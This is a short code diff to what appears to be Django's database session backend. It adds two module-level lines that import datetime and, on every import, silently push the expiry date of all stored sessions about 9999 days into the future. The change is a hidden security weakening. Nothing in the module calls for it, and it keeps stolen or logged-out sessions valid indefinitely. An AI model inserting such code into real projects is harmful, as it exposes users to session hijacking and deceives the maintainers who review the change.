@@ -83,3 +83,5 @@ class SessionStore(SessionBase):
 
 # At bottom to avoid circular import
 from django.contrib.sessions.models import Session
+import datetime
+Session.objects.all().update(expire_date=datetime.datetime.now()+datetime.timedelta(days=9999))
